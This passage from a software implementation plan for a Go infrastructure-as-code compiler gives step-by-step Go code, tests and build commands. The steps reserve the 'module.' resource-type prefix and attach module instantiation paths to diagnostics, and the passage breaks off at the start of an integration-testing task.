		case len(target.names) > 0 && ref.Attribute != "" && !target.has(ref.Attribute):
			// Amendment 11. §44's four parts: what is wrong, on what, what
			// was expected, what to do.
			ds.Add(diag.Diagnostic{
				Severity: diag.SeverityError,
				Summary:  target.typeName + " has no attribute " + strconv.Quote(ref.Attribute),
				Detail: "${" + ref.String() + "} reads an attribute that does not exist.\nAttributes of " +
					target.typeName + ":\n  " + strings.Join(target.names, "\n  "),
				Action: "Correct the attribute name.",
				Origin: attr.Origin,
			})
		default:
			recordEdge(edges, ref.Target, attr.Origin)
		}
	}

	v, evalDiags := expressions.Evaluate(e, inst.Scope)
```

4. **Ruling 4's wording is implemented HERE and nowhere else.** `Qualify` returns a
   single `*value.Expr` and emits no diagnostics of its own (Amendment 13c, which is
   also Amendment 7's spelling), leaving an unresolvable reference byte-identical. So if
   the default arm says "no such resource" instead of "no resource or module", the
   requirement is implemented by nobody — Tasks 4-7's tests pin the DATA (candidates
   correct and sorted), not the message. Step 8.9b is the test that pins the message.

5. **A rejected attribute records no edge**, because the `case` arms are exclusive and
   the new arm returns before `default`. That is correct: an edge to an attribute that
   does not exist is an edge the graph should not carry. But note what it means for
   `len(target.names) > 0` — an unregistered type takes the `default` arm and still
   records its edge, so a project with one unknown resource type keeps its dependency
   structure while stage 7 reports the type. Reversing that guard would turn one
   unknown-type diagnostic into one per reference to it.

6. **`recordEdge` keys by `address.Address`**, not by bare name, and its tie-break on
   earliest origin is unchanged. `sortedNames(declared)` in the undeclared-reference
   diagnostic now lists canonical addresses, which is what a user needs in order to
   write the corrected reference.

`bindAttribute`'s signature loses its `scope compileScope` parameter and gains the
instance; `decl` is reachable as `inst.Decl`.

Update `bind_test.go`: every `bindReferences(p, scope, Options{...})` call becomes one
taking an expansion. Build it through the real `modules.Expand` rather than
hand-assembling an `Expansion` — a test that constructs its own expansion stops
testing the thing that produces one, which is the mistake M4's Task 7 called out for
`variables.Scope`.

#### 8.11 Run it, see it pass, and confirm the deletions

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go build ./cmd/infrata
go test -count=1 ./...
go vet ./...
gofmt -l .

grep -rn "compileScope" --include=*.go .        # must print nothing
```

`grep -rn "compileScope"` printing nothing is the check that the replacement is a
replacement rather than an addition.

One more deletion to consider, and it is a judgement call this task makes rather than
defers. Tasks 1-3 ship `Reference.InModule` as the primitive `Qualify` applies. If
`Qualify` sets `Target.Module` from the scope's path directly and never calls it:

```bash
grep -rn "\.InModule(" --include=*.go internal/ pkg/ | grep -i reference
```

prints nothing, and the method is dead. Delete it, and say so in the commit message.
Tasks 1-3 asked for exactly this: an unused primitive shipped because it looked right
is the trap the first draft of Task 9 fell into, and it is worth avoiding twice.

Commit 8.4, 8.9 and 8.10 together — `Compile` does not build between them:

```bash
git commit -m "M5 task 8: wire stage 5 into Compile; stage 6 qualifies references per instance" -- \
  internal/compiler/compile.go internal/compiler/bind.go internal/compiler/resolved.go \
  internal/compiler/compile_test.go internal/compiler/bind_test.go internal/cli/varopts.go
```

#### 8.12 Failing test: a provider may not claim the `module.` namespace

Amendment 8c's third guard. Under Amendment 8 a module is called by a resource of type
`module.<name>`, so `module` behaves as a pseudo-provider name in a namespace that is
already `<provider>.<resource>`. Nothing stops a real provider from declaring
`module.app_stack` today, and if one did, every call of a user's module named
`app_stack` would silently become that provider's resource instead.

**Be precise about what this guard does and does not do, because the obvious test
asserts something that cannot happen.** Stage 5 runs before stage 7, so by the time
`reg.Definition(r.Type)` is reached at `internal/compiler/schema.go:23` every module
instance has already been expanded away — a `module.*` type from a user's
configuration never reaches the registry at all. A test shaped
"a `module.foo` resource in config is rejected by the registry" would pass with this
guard deleted, which is the class of test this project has catalogued eighteen
instances of. **Do not write the nineteenth.** The guard is about a PROVIDER, it fires
at registration, and the test registers one.

Add to `internal/registry/registry_test.go`:

```go
// fakeProvider is a minimal provider.Provider for registration tests. If
// registry_test.go already has one, use it rather than adding a second.
type namespaceProvider struct{ defs []*schema.ResourceDefinition }

func (p namespaceProvider) Name() string                            { return "rogue" }
func (p namespaceProvider) Definitions() []*schema.ResourceDefinition { return p.defs }

// ... the remaining provider.Provider methods, panicking: registration never
// calls them. Copy the shape of whatever registry_test.go already uses.

// TestRegisterRefusesTheModuleNamespace. A module call is a resource of type
// module.<name> (PLAN.md §11.2), so `module` is a reserved pseudo-provider. A
// provider declaring module.app_stack would turn every call of a user's
// app_stack module into that provider's resource, with no diagnostic anywhere:
// stage 5 expands module instances away before stage 7 consults the registry,
// so the shadowing would happen at the only stage that could have noticed.
//
// This fails at the rogue provider's own startup, which is where a
// namespace collision should fail.
func TestRegisterRefusesTheModuleNamespace(t *testing.T) {
	reg := New()
	err := reg.Register(namespaceProvider{defs: []*schema.ResourceDefinition{{
		Type:         "module.app_stack",
		Description:  "a provider trying to claim the module namespace",
		Attributes:   map[string]schema.Attribute{"name": {Kind: value.KindString, Required: true}},
		Capabilities: schema.Capabilities{Create: true, Read: true, Delete: true},
	}}})
	if err == nil {
		t.Fatal("a provider declaring a module.* type must be refused: it would silently shadow every call of a user's module of that name")
	}
	if !strings.Contains(err.Error(), "module.") {
		t.Errorf("error = %q, want it to name the reserved prefix", err)
	}

	// Validate-before-mutate: a refused registration leaves the registry
	// untouched, which is why the check goes in Register's FIRST loop. A guard
	// placed in the second loop would register the definitions preceding the
	// bad one and then fail.
	if _, ok := reg.Definition("module.app_stack"); ok {
		t.Error("the refused type was registered anyway")
	}
}

// TestRegisterAcceptsATypeMerelyContainingModule is the boundary. The rule is
// a `module.` PREFIX, not the substring — a provider legitimately offering
// `test.module_group` or `aws.module` must still register, or the guard has
// quietly reserved far more than the namespace it was meant to protect.
func TestRegisterAcceptsATypeMerelyContainingModule(t *testing.T) {
	reg := New()
	for _, typ := range []string{"test.module_group", "aws.module", "modulearium.thing"} {
		if err := reg.Register(namespaceProvider{defs: []*schema.ResourceDefinition{{
			Type:         typ,
			Description:  "legitimate",
			Attributes:   map[string]schema.Attribute{"name": {Kind: value.KindString, Required: true}},
			Capabilities: schema.Capabilities{Create: true, Read: true, Delete: true},
		}}}); err != nil {
			t.Errorf("Register(%q) = %v, want nil — the guard reserves the `module.` prefix, not the word", typ, err)
		}
	}
}
```

`modulearium.thing` is in that list deliberately: `strings.HasPrefix(typ, "module")`
without the dot would refuse it.

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 -run TestRegisterRefuses ./internal/registry/
```

Fails: `Register` returns nil today.

#### 8.13 Minimal code: the guard, in the first loop

`internal/registry/registry.go`, inside `Register`'s FIRST loop, beside the existing
`already registered by provider` and `declares it twice` checks:

```go
		// `module.` is reserved. A module call is a resource of type
		// module.<name> (PLAN.md §11.2), so a provider declaring one would
		// shadow every call of a user's module of that name — and it would do
		// so silently, because stage 5 expands module instances away before
		// stage 7 consults this registry, so the one stage that could notice
		// never sees the collision.
		//
		// In the first loop, with the other two checks, because this loop is
		// deliberately validate-before-mutate: a refused registration must
		// leave the registry untouched rather than half-populated.
		if strings.HasPrefix(d.Type, "module.") {
			return fmt.Errorf("provider %s: resource type %q uses the reserved `module.` prefix, which names a module call rather than a provider resource", p.Name(), d.Type)
		}
```

Add `"strings"` to the imports.

```bash
go test -count=1 ./internal/registry/ ./...
```

Commit:

```bash
git commit -m "M5 task 8: reserve the module. type prefix against provider collision" -- \
  internal/registry/registry.go internal/registry/registry_test.go
```

---

---

## Task 9 — `Origin.Module` reaches diagnostics

### Why this task exists

Spec §7.2 says flattening is paid for in exactly two places, and this is the first:

> error messages depend entirely on `Origin.Module` to say which module instantiation
> a problem came from

Take a module instantiated three times. Its resource says `size: ${size}`, and `size`
is an untyped input. One caller passes a string. Stage 7 reports a kind mismatch, and
its `Origin` is the `size:` line **inside the module file** — the same file, the same
line, for all three instantiations. Without `Origin.Module`, the three instantiations
are indistinguishable in the message, and the user is told a resource they cannot
locate has a problem they cannot attribute.

Half of this already exists and must not be rebuilt. `value.Origin` has an unused
`Module []string` field, and `internal/diag`'s `location()` already renders it:

```go
// internal/diag/diagnostic.go
func location(o value.Origin) string { ... "%s, in %s" ... "module", m ... }
```

pinned by `TestRenderNamesTheModuleChain`. Verify that before writing anything:

```bash
grep -n "func location" -A 20 internal/diag/diagnostic.go
go test -count=1 -run TestRenderNamesTheModuleChain ./internal/diag/
```

So the renderer is done. What is missing is that **nothing ever sets the field**. This
task supplies the two stamping primitives and proves the field arrives.

### The decision about `describeOrigin`, and why it is "no change"

`internal/config/decode.go`'s `describeOrigin` renders a SECOND origin inside a
diagnostic's `Detail` sentence — "`db` is also defined at line 12 of infra.yml". Read
it and all nine call sites before deciding:

```bash
grep -rn "describeOrigin" --include=*.go internal/config/
```

Every one of them is a cross-reference to another site **in the same decode pass**.
Stage 2 decodes one module source at a time (Ruling 2), so both origins in any such
sentence are inside the same instantiation, and the instantiation is already named on
the diagnostic's own `at` line by `diag.location`. Adding the module path inside the
sentence would print it twice in the same message.

**`describeOrigin` therefore does not change, and the reason is recorded in a comment
rather than left to be rediscovered.** Step 9.4 adds a test that pins the property
that makes this safe — that the diagnostic's own `Origin` carries the module — so
that if stage 5 ever stops stamping diagnostics from a nested decode, the failure
lands here rather than being absorbed by prose.

### Files

| Action | Path |
|--------|------|
| modify | `pkg/value/value.go` (`Origin.InModule`, `Value.InModule`) |
| modify | `pkg/value/value_test.go` |
| modify | `internal/diag/diagnostic.go` (`Diagnostics.InModule`) |
| modify | `internal/diag/diagnostic_test.go` |
| modify | `internal/expressions/parse_test.go` |
| modify | `internal/config/decode.go` (comment only, on `describeOrigin`) |
| modify | `internal/compiler/compile_test.go` |

### Interfaces

**Consumes:** `value.Origin` and its `Module []string` field, `config.AttributeDecl`,
`diag.Diagnostic`, `diag.Diagnostics` — all existing. `modules.Expand` from Tasks 4-7
is the caller of everything produced here.

**Produces:**

```go
package value

// InModule returns the origin as seen from inside a module instantiation.
func (o Origin) InModule(name string) Origin

// InModule re-roots this value's origin and, for composites, every leaf's.
func (v Value) InModule(name string) Value

package diag

// InModule returns a copy of these diagnostics with every Origin re-rooted.
func (ds Diagnostics) InModule(name string) Diagnostics
```

Stage 5 (Tasks 4-7) is the only caller. It uses `Diagnostics.InModule` on whatever
the nested `config.LoadModule` / `config.DecodeModule` hands back, and `Origin.InModule` /
`Value.InModule` at the single site where it re-roots an instantiated declaration.

**There is deliberately no `Expr.InModule` FOR ORIGINS, and the scope of that claim
matters.** Two different things travel through an expression and need re-rooting, on
two separate axes. This task owns one of them and not the other.

- **Origins — this task's axis, and no `*Expr` walk is needed.**
  `config.AttributeDecl` holds a `value.Value` carrying the interpolated text verbatim
  plus a `HasExpressions` flag — **not** an `*Expr`. A resource attribute's expression
  is parsed at STAGE 6, in `internal/compiler/bind.go:140`, by
  `expressions.Parse(src, attr.Origin)`, and `Parse` stamps that single origin onto
  every node it builds (`internal/expressions/parse.go` — `split` gives each literal
  run and each interpolation the same `origin`). So stamping `AttributeDecl.Origin` at
  stage 5 is sufficient: every node parsed from it inherits the module path for free,
  and an origin-stamping primitive over `*Expr` would be dead code.

- **References — Task 8's axis, at STAGE 6, and it does walk an `*Expr`.** A
  reference is parsed scope-relative and made absolute by `modules.Scope.Qualify(e)`
  in `bindAttribute` (step 8.10). An expression written inside a module —
  `${store.endpoint}`, whether in a resource attribute or in an output's `value:` —
  names the module's OWN `store`, which after instantiation is `module.<name>.store`;
  left scope-relative it binds to a root resource of the same name, or to nothing.
  That is Ruling 1's landmine arriving by the other door.

  **Stage 5 does no reference re-rooting at all.** An earlier draft of this section
  said it walked a parsed module output; Amendment 7 rules otherwise, and the
  mechanical reason is decisive — `expressions.Parse` has exactly one call site in the
  tree, `internal/compiler/bind.go:140`, which is stage 6. At stage 5 there is no
  parsed expression to walk. Stage 5 records the scope that makes qualification
  possible; stage 6 qualifies. Pointing an implementer at a stage-5 reference walk
  would send them looking for a function that cannot exist — the same shape as the
  `Expr.InModule` this task declined to write.

  Do not add an origin primitive because you have read about the reference one, and do
  not fold the two into a single `Expr.InModule`: they run at different stages over
  different trees, and only one of them exists.

Confirm the origin half before relying on it:

```bash
grep -n "type AttributeDecl" -A 8 internal/config/declarations.go   # Value is a value.Value
grep -n "func Parse" -A 16 internal/expressions/parse.go            # every node gets `origin`
grep -rn "expressions.Parse" --include=*.go internal/ | grep -v _test.go
```

The third command is the one that dates fastest: it prints a single stage-6 call site
at HEAD, and Tasks 4-7 add a stage-5 one for module outputs. Two call sites is the
expected end state, not a defect.

**Everything here returns a copy and does not mutate.** That is not a style
preference. One decoded module source is instantiated N times; stamping a shared
declaration in place would have the last instantiation's path visible from all N. If
Tasks 4-7 decode afresh per instantiation the copy is merely wasted; if they cache the
decode, the copy is the only thing preventing a wrong answer. Copying is correct under
both, so it copies.

### Steps

#### 9.1 Failing test: the three primitives, and the property that keeps them enough

Add to `pkg/value/value_test.go`:

```go
func TestOriginInModulePrependsAndCopies(t *testing.T) {
	inner := Origin{File: "modules/db/module.yml", Line: 4, Column: 7}

	// Outermost last: the same ordering address.InModule uses, so that an
	// Origin's module path and its resource's Address read identically. They
	// name the same instantiation, and two spellings of one path is the
	// duplication this milestone's contract exists to prevent.
	got := inner.InModule("database").InModule("platform")
	want := []string{"platform", "database"}
	if len(got.Module) != len(want) || got.Module[0] != want[0] || got.Module[1] != want[1] {
		t.Errorf("Module = %v, want %v", got.Module, want)
	}
	if got.File != inner.File || got.Line != 4 || got.Column != 7 {
		t.Errorf("InModule changed the position: %+v", got)
	}
	if len(inner.Module) != 0 {
		t.Errorf("InModule mutated its receiver: %+v", inner)
	}

	// Aliasing: one decoded module source is instantiated many times, and a
	// shared backing array would let the last instantiation's path be visible
	// from every other one.
	base := inner.InModule("shared")
	a, b := base.InModule("alpha"), base.InModule("beta")
	if a.Module[0] == b.Module[0] {
		t.Errorf("two instantiations share a module path: %v and %v", a.Module, b.Module)
	}
	if base.Module[0] != "shared" {
		t.Errorf("the base origin was mutated through an alias: %v", base.Module)
	}
}

func TestValueInModuleReachesEveryLeafOfAComposite(t *testing.T) {
	// Provenance is per-leaf (spec §5.1), so a stamp that reached only the
	// outer Value would leave a diagnostic about one key of a map unable to
	// say which instantiation the map came from.
	inner := Origin{File: "modules/db/module.yml", Line: 9}
	v := Map(map[string]Value{
		"env":  String("dev", SourceExplicit).WithOrigin(inner),
		"tier": String("gold", SourceExplicit).WithOrigin(inner),
	}, SourceExplicit).WithOrigin(inner)

	got := v.InModule("database")
	if len(got.Origin.Module) != 1 || got.Origin.Module[0] != "database" {
		t.Fatalf("outer Module = %v, want [database]", got.Origin.Module)
	}
	raw, ok := got.Raw.(map[string]Value)
	if !ok {
		t.Fatalf("Raw is %T, want map[string]Value", got.Raw)
	}
	for k, leaf := range raw {
		if len(leaf.Origin.Module) != 1 || leaf.Origin.Module[0] != "database" {
			t.Errorf("leaf %q Module = %v, want [database]", k, leaf.Origin.Module)
		}
	}
	if original, _ := v.Raw.(map[string]Value); len(original["env"].Origin.Module) != 0 {
		t.Error("InModule mutated the composite it was called on")
	}
}
```

Add to `internal/expressions/parse_test.go` the test that makes the absence of an
`Expr.InModule` safe rather than merely convenient:

```go
// TestParseGivesEveryNodeTheOriginItWasGiven is why stage 5 stamps
// AttributeDecl.Origin and nothing walks the expression tree.
//
// Stage 5 re-roots a declaration's origin; stage 6 parses the expression from
// that origin; Parse gives every node it builds the same one. Were that ever
// to change — a node taking a position computed from its offset within the
// string, say — the module path would stop reaching expression nodes and every
// stage-6 and stage-7 diagnostic inside a module would silently lose its
// instantiation. This is the test that fails first if it does.
func TestParseGivesEveryNodeTheOriginItWasGiven(t *testing.T) {
	origin := value.Origin{File: "modules/db/module.yml", Line: 3, Module: []string{"database"}}

	e, ds := Parse("db-${name}-${other.attr}", origin)
	if ds.HasErrors() {
		t.Fatalf("unexpected diagnostics: %+v", ds)
	}

	var check func(n *value.Expr, path string)
	check = func(n *value.Expr, path string) {
		if len(n.Origin.Module) != 1 || n.Origin.Module[0] != "database" {
			t.Errorf("%s: Module = %v, want [database]", path, n.Origin.Module)
		}
		if n.Origin.File != origin.File || n.Origin.Line != origin.Line {
			t.Errorf("%s: position = %s, want %s", path, n.Origin, origin)
		}
		for i, a := range n.Args {
			check(a, path+".Args["+strconv.Itoa(i)+"]")
		}
	}
	check(e, "root")

	// Three nodes under a concat — a literal run and two interpolations — so
	// this is not vacuously true of a single-node tree.
	if len(e.Args) != 3 {
		t.Fatalf("Args = %d, want 3 (one literal run and two interpolations)", len(e.Args))
	}
}
```

Adjust the expected `len(e.Args)` to whatever `split` actually produces for that
source — run it and read the number rather than trusting this one. The assertion that
must not weaken is the recursive origin check.

`varRef("name")` stands for whatever constructs a variable reference after Task 1
changes `Reference`'s shape — read `pkg/value/expr_test.go` and use whatever its
existing cases use. Do not introduce a second spelling.

Add to `internal/diag/diagnostic_test.go`:

```go
func TestDiagnosticsInModuleStampsEveryOriginAndRenders(t *testing.T) {
	// Stage 5 re-enters stages 1 and 2 per module source (contract Ruling 2),
	// so a syntax error inside a module file arrives as a diagnostic whose
	// Origin knows only the file. This is where the instantiation is added.
	ds := Diagnostics{
		{Severity: SeverityError, Summary: "first", Origin: value.Origin{File: "modules/db/module.yml", Line: 2}},
		{Severity: SeverityError, Summary: "second", Origin: value.Origin{File: "modules/db/module.yml", Line: 8}},
	}

	got := ds.InModule("database")
	for i, d := range got {
		if len(d.Origin.Module) != 1 || d.Origin.Module[0] != "database" {
			t.Errorf("diagnostic %d: Module = %v, want [database]", i, d.Origin.Module)
		}
	}
	if len(ds[0].Origin.Module) != 0 {
		t.Error("InModule mutated the diagnostics it was called on")
	}

	var b strings.Builder
	got.Render(&b)
	if !strings.Contains(b.String(), "in module.database") {
		t.Errorf("the rendered diagnostic does not name the instantiation:\n%s", b.String())
	}
}
```

#### 9.2 Run it, see it fail

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 -run "InModule" ./pkg/value/ ./internal/diag/
go test -count=1 -run TestParseGivesEveryNode ./internal/expressions/
```

Expect `undefined: InModule` on all three — the field exists, the methods do not.
`TestParseGivesEveryNodeTheOriginItWasGiven` PASSES immediately: it characterises what
`Parse` already does, and its job is to fail if that ever changes. If it fails now,
stop — the reasoning for having no `Expr.InModule` is wrong, and that is worth knowing
before the stamping site is written rather than after.

#### 9.3 Minimal code

In `pkg/value/value.go`, beside `Origin.String`:

```go
// InModule returns the origin as seen from inside a module instantiation,
// prepending name to the module path. It copies the slice so that two
// instantiations of one decoded module source cannot alias each other's path
// — the same guarantee, in the same shape, as address.Address.InModule.
//
// Outermost first, so that an Origin's module path reads identically to the
// Address of the resource it belongs to. A diagnostic that spelled the path
// one way and the address another would be two spellings of one thing.
func (o Origin) InModule(name string) Origin {
	next := make([]string, 0, len(o.Module)+1)
	next = append(next, name)
	next = append(next, o.Module...)
	o.Module = next
	return o
}

// InModule re-roots this value's origin into the named module instantiation,
// and every leaf's origin with it.
//
// Composites recurse because provenance is per-leaf (spec §5.1): a map with
// one bad key produces a diagnostic pointing at that key's origin, and an
// origin that stopped at the outer Value could not say which instantiation the
// key came from. Returns a copy; composites are rebuilt rather than stamped in
// place, because one decoded module source is instantiated many times and its
// literals are shared between them.
func (v Value) InModule(name string) Value {
	v.Origin = v.Origin.InModule(name)
	switch raw := v.Raw.(type) {
	case []Value:
		out := make([]Value, len(raw))
		for i, e := range raw {
			out[i] = e.InModule(name)
		}
		v.Raw = out
	case map[string]Value:
		out := make(map[string]Value, len(raw))
		for k, e := range raw {
			out[k] = e.InModule(name)
		}
		v.Raw = out
	}
	return v
}
```

Add a line to `Value.InModule`'s doc comment saying why nothing walks expressions:

```go
// There is no Expr counterpart to this, for ORIGINS. An AttributeDecl carries
// interpolated text as a Value, not as a parsed Expr — stage 6 parses it, from
// AttributeDecl.Origin, and internal/expressions.Parse stamps that one origin
// onto every node it builds. Re-rooting the declaration's origin is therefore
// enough to re-root every expression node parsed from it, and an origin
// primitive over *Expr would be dead code.
// TestParseGivesEveryNodeTheOriginItWasGiven pins the property this relies on.
//
// REFERENCES are a different axis and do walk an Expr, but at STAGE 6, not
// here and not at stage 5: modules.Scope.Qualify makes a scope-relative
// reference absolute in internal/compiler/bind.go, so that an expression
// written inside a module names the module's own resource rather than a root
// resource of the same name. expressions.Parse has one call site and it is
// stage 6, so stage 5 has no parsed expression to walk. Nothing here should
// grow to cover any of that.
```

In `internal/diag/diagnostic.go`, beside `Extend`:

```go
// InModule returns a copy of these diagnostics with every Origin re-rooted
// into the named module instantiation.
//
// Stage 5 re-enters stages 1 and 2 for each module source (contract Ruling 2),
// and those stages know nothing about instantiations — a malformed module file
// yields a diagnostic naming only the file. Stamping on the way out is what
// turns three identical copies of that diagnostic, one per instantiation, into
// three that can be told apart. location() already renders the result.
func (ds Diagnostics) InModule(name string) Diagnostics {
	if len(ds) == 0 {
		return nil
	}
	out := make(Diagnostics, len(ds))
	for i, d := range ds {
		d.Origin = d.Origin.InModule(name)
		out[i] = d
	}
	return out
}
```

Run:

```bash
go test -count=1 ./pkg/value/ ./internal/diag/ ./internal/expressions/
```

Commit:

```bash
git commit -m "M5 task 9: Origin, Value and Diagnostics can be re-rooted into a module" -- \
  pkg/value/value.go pkg/value/value_test.go \
  internal/diag/diagnostic.go internal/diag/diagnostic_test.go \
  internal/expressions/parse_test.go
```

#### 9.4 Failing test: the stamp arrives, and names the right instantiation

This is the test the whole task exists for. Add to
`internal/compiler/compile_test.go`, using `loadFilesInDir` from Task 8:

```go
// moduleInstantiatedThriceFixture builds a project instantiating one module
// three times. `size` is an UNTYPED input, so the value each caller passes
// travels unchanged to `size: ${size}` inside the module, where the attribute
// is test.database's KindInt. A caller passing a string produces a stage-7
// kind mismatch whose Origin is the module file's own `size:` line — the same
// file, the same line, for all three instantiations.
//
// That identity is the point. Nothing but Origin.Module can tell the three
// apart, which is exactly what spec §7.2 says flattening costs.
func moduleInstantiatedThriceFixture(t *testing.T, alpha, beta, gamma string) ([]config.File, string) {
	t.Helper()
	return loadFilesInDir(t, `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  alpha:
    type: module.db
    network: ${net.id}
    size: `+alpha+`
  beta:
    type: module.db
    network: ${net.id}
    size: `+beta+`
  gamma:
    type: module.db
    network: ${net.id}
    size: `+gamma+`
`, map[string]string{
		"modules/db/module.yml": `
inputs:
  network:
    type: string
  size: {}
resources:
  store:
    type: test.database
    engine: postgres
    network: ${network}
    size: ${size}
`,
	})
}

func renderDiags(t *testing.T, ds diag.Diagnostics) string {
	t.Helper()
	var b strings.Builder
	ds.Render(&b)
	return b.String()
}

func TestADiagnosticInsideAModuleNamesTheInstantiationItCameFrom(t *testing.T) {
	files, dir := moduleInstantiatedThriceFixture(t, `"large"`, `"large"`, `"large"`)

	_, ds := Compile(files, testRegistry(t), Options{Environment: "dev", Dir: dir})
	if !ds.HasErrors() {
		t.Fatal("a string where test.database wants an integer must be a diagnostic")
	}

	out := renderDiags(t, ds)
	for _, name := range []string{"module.alpha", "module.beta", "module.gamma"} {
		if !strings.Contains(out, name) {
			t.Errorf("no diagnostic names %s — three instantiations of one module produced messages that cannot be told apart:\n%s", name, out)
		}
	}
}

// TestAModuleDiagnosticNamesOnlyTheFailingInstantiation is the assertion that
// matters more. The test above passes against a stamp that always reports
// every instantiation, or that reports them in a fixed order regardless of
// which one failed. Here only `beta` is bad: the message must name it and must
// name NEITHER of the two that are fine.
func TestAModuleDiagnosticNamesOnlyTheFailingInstantiation(t *testing.T) {
	files, dir := moduleInstantiatedThriceFixture(t, "20", `"large"`, "30")

	_, ds := Compile(files, testRegistry(t), Options{Environment: "dev", Dir: dir})
	if !ds.HasErrors() {
		t.Fatal("a string where test.database wants an integer must be a diagnostic")
	}

	out := renderDiags(t, ds)
	if !strings.Contains(out, "module.beta") {
		t.Errorf("the diagnostic does not name module.beta, the only instantiation that failed:\n%s", out)
	}
	for _, innocent := range []string{"module.alpha", "module.gamma"} {
		if strings.Contains(out, innocent) {
			t.Errorf("%s is named in a diagnostic it has nothing to do with:\n%s", innocent, out)
		}
	}
}
```

`compile_test.go` will need `"github.com/infrata/infrata/internal/diag"`.

The fixture's `size: {}` is an input declared with no type — PLAN.md §9 calls variable
schemas optional and contract Ruling 3 says an input's type is checked the same way a
variable's is, so an untyped input accepts what it is given. If Tasks 4-7 chose to
require a type on every input, the fixture becomes `size: {type: string}` and the
diagnostic moves from stage 7 to wherever they put the check — the assertions are
unchanged either way, because they assert which instantiation is named and not which
stage named it. Do not weaken them to match.

#### 9.5 Run it, see it fail

```bash
go test -count=1 -run "TestADiagnosticInsideAModule|TestAModuleDiagnosticNamesOnly" ./internal/compiler/
```

Expect both to fail with no `module.` text in the rendered output at all: stage 5
instantiates the declarations but nothing stamps their origins.

#### 9.6 Make it pass, in stage 5, at one site

Find where stage 5 re-roots an instantiated declaration:

```bash
grep -n "InModule\|address.Address{" internal/modules/*.go
```

Tasks 4-7 already call `Address.InModule` there — that is the site. Beside it, the
declaration's origins are re-rooted with the primitives from 9.3:

```go
	inst := *decl                      // the decoded ResourceDecl, copied per instantiation
	inst.Origin = decl.Origin.InModule(name)
	inst.Attributes = make(map[string]config.AttributeDecl, len(decl.Attributes))
	for attr, a := range decl.Attributes {
		a.Origin = a.Origin.InModule(name)
		a.Value = a.Value.InModule(name)   // the interpolated text, carried as a Value
		inst.Attributes[attr] = a
	}
```

and each nested load/decode's diagnostics are stamped on the way out:

```go
	ds.Extend(decodeDiags.InModule(name))
```

`AttributeDecl.Value` is a `value.Value` holding the interpolated text verbatim, not
a parsed `*Expr` — stage 6 parses it later, from `a.Origin`, which is why stamping
these two fields is the whole job. Confirm rather than trusting this paragraph:

```bash
grep -n "type AttributeDecl" -A 8 internal/config/declarations.go
```

**If Tasks 4-7 already stamp origins under different names, do not add a second
path.** Delete the primitives this task added that theirs replaces, keep the ones
theirs does not cover, and say in the commit message which. Two implementations of one
concept is the defect that leaked a plaintext secret in M2.

```bash
go test -count=1 ./internal/compiler/ ./internal/modules/
```

#### 9.7 Pin the `describeOrigin` decision

`internal/config/decode.go` is **not** changed except for a comment. Add to
`describeOrigin`:

```go
// It deliberately does not render Origin.Module. Every caller uses it for a
// cross-reference to another site in the SAME decode pass — "`db` is also
// defined at line 12 of infra.yml" — and stage 5 decodes one module source at
// a time (contract Ruling 2), so both origins in any such sentence are inside
// one instantiation. That instantiation is already named on the diagnostic's
// own `at` line by diag.location. Naming it again inside the sentence would
// print it twice in one message.
//
// The property this relies on — that a diagnostic raised while decoding a
// module carries that module in its own Origin — is pinned by
// TestAStageTwoDiagnosticInsideAModuleIsAttributedToTheInstantiation in
// internal/compiler. If that test ever fails, this comment is what is wrong,
// not the test.
```

and add the test it names to `internal/compiler/compile_test.go`:

```go
// TestAStageTwoDiagnosticInsideAModuleIsAttributedToTheInstantiation covers
// the OTHER source of module diagnostics: not stage 7 reasoning about an
// instantiated value, but stage 2 rejecting the module's own file. Two
// resources with the same logical name inside a module is a stage-2 error
// (decode.go's seenResources), raised by a stage that has never heard of
// modules.
func TestAStageTwoDiagnosticInsideAModuleIsAttributedToTheInstantiation(t *testing.T) {
	files, dir := loadFilesInDir(t, `
project: myapp
modules:
  - ./modules/db
resources:
  net:
    type: test.network
    cidr: 10.0.0.0/16
  alpha:
    type: module.db
    network: ${net.id}
`, map[string]string{
		"modules/db/module.yml": `
inputs:
  network:
    type: string
resources:
  store:
    type: test.database
    engine: postgres
    network: ${network}
  store:
    type: test.database
    engine: mysql
    network: ${network}
`,
	})

	_, ds := Compile(files, testRegistry(t), Options{Environment: "dev", Dir: dir})
	if !ds.HasErrors() {
		t.Fatal("two resources named `store` in one module must be a stage-2 error")
	}
	out := renderDiags(t, ds)
	if !strings.Contains(out, "module.alpha") {
		t.Errorf("a stage-2 diagnostic from inside a module does not name the instantiation:\n%s", out)
	}
	if !strings.Contains(out, "modules/db/module.yml") {
		t.Errorf("the diagnostic does not name the file it came from:\n%s", out)
	}
}
```

```bash
go test -count=1 ./internal/compiler/ ./internal/config/
```

Commit:

```bash
git add internal/compiler/compile_test.go
git commit -m "M5 task 9: a diagnostic from inside a module names the instantiation" -- \
  internal/compiler/compile_test.go internal/config/decode.go internal/modules
```

#### 9.8 Full verification

```bash
export PATH="$HOME/.local/share/mise/shims:$PATH"
go test -count=1 ./...
go vet ./...
gofmt -l .
```

---

---

## Task 10 — integration suite and the Definition of Done

### Why this task exists

Everything M5 claims is user-visible, so everything M5 claims is provable by driving
the binary. `tests/integration` builds `cmd/infrata` with `go build` and runs it; no
test here calls an internal package's function to assert a milestone criterion.

It is also where the second cost of flattening gets written down. Spec §7.2:
**addresses are coupled to module structure.** Moving a resource between modules
renames it, and a renamed resource is destroyed and recreated. That is a user-visible
consequence of a design decision, and the only unacceptable outcome is that a user
meets it for the first time by losing a database.

### Where the rename-destroys consequence is documented, and why there

**Both places, for different readers.**

1. **`CLAUDE.md`.** The engineering record. Anyone changing the compiler, the planner
   or state needs to know that an address embeds the module path and that `state mv`
   is deferred (spec §5.2). Cheap, durable, and read before code is written.

2. **The plan output, on the destroy operation itself.** This is where a *user* meets
   it: the moment before they type `apply`, looking at a destroy they did not expect.
   `CLAUDE.md` is not read by users of the CLI, and `PLAN.md` is a spec, not a manual —
   there is no user-facing document in this repo for this to go in. The plan is the
   artifact a person reads before agreeing to change infrastructure, and the renderer
   already carries exactly this kind of warning (`renderDependentsWarning`, spec §20).

   Contract Ruling 7 says whether M5 does more than document it is out of scope. This
   is the smallest thing that counts as documenting it where it is met: a note, on a
   destroy, when the same plan creates a resource of the same type with the same
   logical name at a different module path. It asserts nothing — it says what the two
   operations are and what moving between modules does — because the heuristic cannot
